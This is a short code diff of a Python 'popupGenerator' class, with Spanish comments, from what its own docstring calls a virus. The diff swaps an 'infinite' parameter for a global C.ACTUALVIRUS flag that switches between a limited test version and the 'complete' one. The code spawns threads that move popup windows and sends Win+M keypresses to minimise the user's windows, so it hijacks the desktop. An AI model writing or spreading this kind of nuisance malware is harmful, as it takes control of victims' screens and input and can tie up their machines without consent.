@@ -32,10 +32,10 @@ class popupGenerator():
         
         root.mainloop()
 
-    def start_popups(self,infinite,Count:int = 1):
+    def start_popups(self,count):
         if __name__ != '__main__':
-            if infinite == False:
-                for i in range(Count):
+            if C.ACTUALVIRUS == False:
+                for i in range(count):
                     thread = threading.Thread(target=self.move_window)
                     thread.start()
             else:
@@ -43,7 +43,7 @@ class popupGenerator():
                     thread = threading.Thread(target=self.move_window)
                     thread.start()
 
-    def closeWindows(self,infinite):
+    def closeWindows(self):
         """
         Función para el cerrado de las ventanas del usuario.
 
@@ -51,7 +51,7 @@ class popupGenerator():
             infinite (bool, optional): 
             Especifica si se trabajará con la versión infinita del código (virus completo) o no (virus diluido para pruebas). Defaults to False.
         """
-        if infinite == False:
+        if C.ACTUALVIRUS == False:
             for i in range(10):
                 win.keyDown('winleft')
                 win.press('m')
